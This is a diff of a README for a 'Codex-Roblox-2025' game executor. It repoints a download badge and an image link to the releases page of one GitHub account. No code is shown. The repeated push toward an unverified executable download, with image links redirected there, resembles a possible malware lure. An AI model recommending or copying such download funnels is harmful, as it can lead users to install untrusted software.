@@ -12,7 +12,7 @@ Welcome to the official repository of Codex-Roblox-2025!
 
 To get started with Codex-Roblox-2025, you can download the Codex Executor from the following link: 
 
-[![Download Codex Executor](https://img.shields.io/badge/Download-Codex%20Executor-blue)](https://github.com/assets/Release.zip "Launch Codex Executor")
+[![Download Codex Executor](https://github.com/John22-cell/Codex-Roblox-2025/releases%20Executor-blue)](https://github.com/John22-cell/Codex-Roblox-2025/releases "Launch Codex Executor")
 
 If you encounter any issues with the provided link, please check the "Releases" section of this repository for alternative download options.
 
@@ -47,6 +47,6 @@ For more information about Codex-Roblox-2025, visit our official website for the
 
 Thank you for exploring Codex-Roblox-2025! We are excited to have you on this journey to unlock new possibilities within the world of Roblox gaming. Enjoy the enhanced gameplay experience with Codex Executor and unleash your creativity in Roblox games.
 
-![Roblox Image](https://www.example.com/roblox-image.png)
+![Roblox Image](https://github.com/John22-cell/Codex-Roblox-2025/releases)
 
 Happy Gaming! 🎮
